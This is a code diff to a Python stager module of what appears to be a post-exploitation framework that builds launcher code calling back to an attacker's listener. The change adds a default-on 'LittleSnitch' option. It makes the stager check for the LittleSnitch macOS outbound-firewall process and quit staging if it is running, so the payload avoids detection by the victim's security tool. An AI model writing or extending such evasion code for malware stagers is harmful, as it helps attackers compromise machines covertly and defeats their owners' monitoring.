@@ -31,6 +31,11 @@ class Stager:
                 'Required'      :   False,
                 'Value'         :   ''
             },
+            'LittleSnitch' : {
+                'Description'   :   'Switch. Check for the LittleSnitch process, exit the staging process if it is running. Defaults to True.',
+                'Required'      :   True,
+                'Value'         :   'True'
+            },
             'Base64' : {
                 'Description'   :   'Switch. Base64 encode the output.',
                 'Required'      :   True,
@@ -71,13 +76,14 @@ class Stager:
         userAgent = self.options['UserAgent']['Value']
         proxy = self.options['Proxy']['Value']
         proxyCreds = self.options['ProxyCreds']['Value']
+        LittleSnitch = self.options['LittleSnitch']['Value']
 
         encode = False
         if base64.lower() == "true":
             encode = True
 
         # generate the launcher code
-        launcher = self.mainMenu.stagers.generate_launcher(listenerName, encode=encode, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds)
+        launcher = self.mainMenu.stagers.generate_launcher(listenerName, encode=encode, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds,littlesnitch=LittleSnitch)
 
         if launcher == "":
             print helpers.color("[!] Error in launcher command generation.")
